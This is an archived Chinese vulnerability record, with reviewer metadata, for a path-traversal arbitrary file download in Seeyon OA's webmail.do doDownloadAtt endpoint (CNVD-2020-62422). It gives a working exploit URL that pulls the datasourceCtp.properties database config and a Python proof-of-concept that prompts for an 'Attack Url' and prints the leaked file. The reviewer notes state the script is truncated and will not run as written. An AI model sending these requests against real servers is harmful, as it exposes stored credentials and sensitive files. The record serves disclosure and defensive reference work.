---
source: "MrWQ/vulnerability-paper"
title: "致远OA webmail.do doDownloadAtt路径穿越读取"
product: "致远OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2020-62422"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6-V5/A8-V5/G6，具体补丁未知"
prerequisites: "访问URL无凭证，前置权限未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/IHISaQzNGx9fUElERGZHMQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%20OA%20webmail-do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422.md"
id: "vw-b31ade8d0301ee9cb1a9fd23"
entity_id: "ve-b31ade8d0301ee9cb1a9fd23"
schema_version: "1"
---

# 致远OA webmail.do doDownloadAtt路径穿越读取

## 条目说明

- 对象与具体问题：致远OA；webmail.do doDownloadAtt路径穿越读取
- 版本、配置及部署条件：A6-V5/A8-V5/G6，具体补丁未知
- 认证与权限前提：访问URL无凭证，前置权限未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- CNVD2020-62422主ID；Python vuln_url截断未闭引号，运行不了
- 脚本banner误写Laravel<=5.5.21产品污染，workflow单词匹配太宽松
- 正文URL完整，可用于合并恢复；GobyJSON声称已添加但本篇未附文件

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IHISaQzNGx9fUElERGZHMQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

致远 OA 存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息

**二:  漏洞影响🐇**

致远 OA A6-V5

致远 OA A8-V5

致远 OA G6

**三:  漏洞复现🐋**

访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties

存在漏洞的 OA 系统将会下载 **datasourceCtp.properties** 配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL60769l4OlY9ydJw25wmqZP9Lds9GzIvE2yDZTbOsiagDjY6rViaKUJCQ/640?wx_fmt=png)

更改参数 filePath 可下载其他文件

 **四:  漏洞利用 POC🐋**

```
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Seeyon OA webmail.do (affected releases unverified)                              \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&file
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("\033[32m[o] 目标{}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 文件请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9AsB5L6KluvInGeQz2gmQIiaAgwmCSuEAjaIyMzDYD5WekJFrC1ibavw/640?wx_fmt=png)

Goby & POC
----------

```
GOby POC 目录已经添加漏洞json文件，可以一键导入
致远OA webmail.do任意文件下载 CNVD-2020-62422
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9zzXadyzMOOxueB7KeOLq9wmjsJX7ShiavJib51FLx8v7VeAYwt70Y8g/640?wx_fmt=png)

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在公众号
> 
> 别忘了 Github 下载完给个小星星⭐

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro7uWKGayI2RguaLia8VfTDystgmyZaEk15WcXU9v4WtULgysUGicYFGMQA/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
